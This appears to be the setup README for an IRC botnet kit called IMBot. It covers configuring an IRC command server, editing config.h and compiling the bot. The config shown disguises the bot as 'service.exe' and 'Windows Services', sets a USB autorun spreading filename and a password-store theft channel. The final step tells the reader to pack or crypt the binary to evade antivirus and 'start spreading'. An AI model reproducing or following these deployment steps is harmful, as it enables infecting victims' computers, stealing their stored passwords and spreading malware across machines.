***********************

1) Firstly you are gonna need an irc server, This bot works best on a modded irc server, i have included
   a server link in IRCD_Instructions.txt. This server is the one i have done all the testing on and works best!
   If you use another irc server your bots may connect and then disconnect instantly, if this happens you will have
   to uninstall the server and try again. Full instructions on how to set it up will be found in IRCD_Instructions.txt.

2) Set up your compiler and runtime environment. You can find out how to do this by reading "Compile_Instructions.txt".

3) This bot has an optional torrent seeder, if you wish to use this then you will need to upload your already seeded
   torrent to a host that you will then add in "/tools/torrent/uTorrent/torrent_config.h" and "/tools/torrent/Azerus/config.h". 
   If you want to add this then you will need to compile this first, then open /lib/res.rc with notepad and take away the 
   2 "//" symbols on the second line. If you dont want to use this just move to the next step!

4) Now you will need to configure your bot. open config.h with either msdev c++ or notepad and edit the config to
   what suits you best. Your config should look something like this:

/* START CONFIG.h */

char xetumhandle[]		= "aS3V6Nu";
char bid[]			= "IMBot";
char prefix			= '.';
char gotopth[]			= "%windir%";
char exename[]			= "service.exe";
char password[]			= "test";
char authhost1[]		= "*!*@*";
char *authost[] 		= { authhost1 };
char szRegname[]	    	= "Windows Services";
char USB_STR_FILENAME[]		= "autorunme.exe";
char USB_CHANNEL[]		= "#test";	// USB Chan
char pstore_chan[]		= "#test";	// PSTORE Chan

SERVER sinfo[]={
		{
		"irc.h1t3m.org","serverpass",6667,"#mainchan","","-ix","-ix","#msnchan",
		},
	};

/* END CONFIG.H */

   After you have edited config.h save it and then goto the file "/cpp/usb.cpp" and edit this line to the
   channel you want usb spread messages redirected too:

/* START UDB.CPP */

   #define USB_CHANNEL		"#usb#"

/* END USB.CPP   */

5) Now that your config is done you can either move to step 5 and compile, or change some of your bots
   commands in cmd.h. If you wish to edit just change the values inside the "".

6) To compile double click on "xBuild.cmd" and cmd should open and start compiling. If it says an error, or cmd
   dosen't compile it, open imbot.dsw with msdev and click the "File View" tab, then right click "imbot files" 
   and select "Build" to start compiling.

7) If you compiled with xBuild.cmd you will have a new folder called "exe" with imbot.exe inside. If you compiled
   via imbot.dsw then you will have a folder called "Bin" with imbot.exe inside. This imbot.exe file is your un-packed
   bot. Use your favourite packer or crypter to make un detectable to Av's and start spreading.
